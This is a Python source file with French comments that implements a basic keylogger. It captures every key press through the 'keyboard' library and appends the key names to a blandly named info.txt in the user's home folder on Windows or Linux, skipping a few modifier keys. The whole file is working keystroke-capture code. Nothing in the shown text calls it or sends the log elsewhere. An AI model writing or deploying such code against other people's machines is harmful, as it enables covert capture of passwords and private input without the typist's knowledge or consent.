import keyboard, platform, os


#====================================Global-Function====================================#
#fonction de debug
def dump(var):
    print("--------------")
    print(f"{type(var)} --> {var}")
    print("--------------")
    exit()



#detecte quel os est utilisé
def os_detect():
    os_name = platform.system()
    
    if os_name == "Windows":
        return "Windows"
    if os_name == "Linux":
        return "Linux"
#====================================Global-Function====================================#



#====================================part-of-keyboard-event====================================#

#defini une liste de touche à ignorer dans l'enregistrement des touches clavier
def ignore():
    return ['alt gr', 'maj', 'verr.maj', 'esc', 'tab', 'windows gauche']

#répertoir du fichier
def path_file():
    os_name = os_detect()
    #recupère le chemin du dossier utilisateur
    path_user = os.path.expanduser('~')
    if os_name == "Windows":
        file = "\\info.txt"
        path = path_user + file
        return path
    if os_name == "Linux":
        file = "/info.txt"
        path = path_user + file
        return path


#Stockage des touches enregistré dans un fichier
def file(key):
    path = path_file()        
    with open(path,'a+') as fic:
        fic.write(key)

#Enregistrement de la touche entré
def rec_key():
    i = True
    while i:
        #enregistre les touches du clavier
            key = keyboard.read_event()
            #evite qu'une touche entré soit dupliqué deux fois (pression, elevation)
            if key.event_type == keyboard.KEY_DOWN:
                if key.name == 'space':
                    print(" ")
                elif key.name == 'enter':
                    print('\n')
                #ignore une liste de touche défini
                elif key.name in ignore():        
                    pass
                else:
                    file(key.name)

#==============================================keyboard-event==============================================#



